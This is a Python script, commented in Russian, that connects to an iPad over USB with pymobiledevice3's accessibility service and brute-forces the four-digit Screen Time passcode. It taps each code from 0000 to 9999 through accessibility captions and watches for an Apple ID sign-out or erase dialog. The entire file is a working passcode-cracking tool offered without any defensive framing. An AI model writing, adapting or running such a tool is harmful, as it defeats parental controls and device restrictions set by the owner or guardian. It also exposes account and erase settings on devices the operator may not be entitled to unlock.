import asyncio
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.accessibilityaudit import AccessibilityAudit


def _raw(el):
    return el.element._fields['PlatformElementValue_v1']


async def press_key(ax, digit: str, timeout: int = 5) -> bool:
    """Нажать клавишу цифры на клавиатуре."""
    target = f"{digit}, Воспроизводит звук"
    deadline = asyncio.get_event_loop().time() + timeout
    async for el in ax.iter_elements():
        caption = el.caption or ""
        if caption.startswith(target):
            await ax.perform_press(_raw(el))
            await asyncio.sleep(0.2)
            return True
        if asyncio.get_event_loop().time() > deadline:
            break
    return False


async def apple_id_dialog_visible(ax) -> bool:
    """Проверить появился ли диалог Apple ID после ввода пароля."""
    keywords = ["выйти", "sign out", "стереть ipad", "erase ipad"]
    deadline = asyncio.get_event_loop().time() + 3
    async for el in ax.iter_elements():
        caption = (el.caption or "").lower()
        if any(k in caption for k in keywords):
            print(f"  Диалог: {el.caption}")
            return True
        if asyncio.get_event_loop().time() > deadline:
            break
    return False


async def try_code(ax, code: str) -> bool:
    """Ввести код и проверить результат."""
    for digit in code:
        ok = await press_key(ax, digit)
        if not ok:
            print(f"  Клавиша {digit} не найдена!")
    await asyncio.sleep(1.0)
    return await apple_id_dialog_visible(ax)


async def brute_force(length: int = 4):
    lockdown = await create_using_usbmux()
    print(f"Подключён: {lockdown.product_type} — iOS {lockdown.product_version}")
    print("Убедись что экран ввода пароля Screen Time открыт на iPad\n")

    async with AccessibilityAudit(lockdown) as ax:
        total = 10 ** length
        for i in range(total):
            code = str(i).zfill(length)
            result = await try_code(ax, code)
            print(f"[{i+1}/{total}] {code} ... {'✓ НАЙДЕН' if result else '✗'}")

            if result:
                print(f"\nПароль Screen Time: {code}")
                return code

            await asyncio.sleep(0.2)

    print("Пароль не найден")
    return None


if __name__ == "__main__":
    asyncio.run(brute_force(length=4))
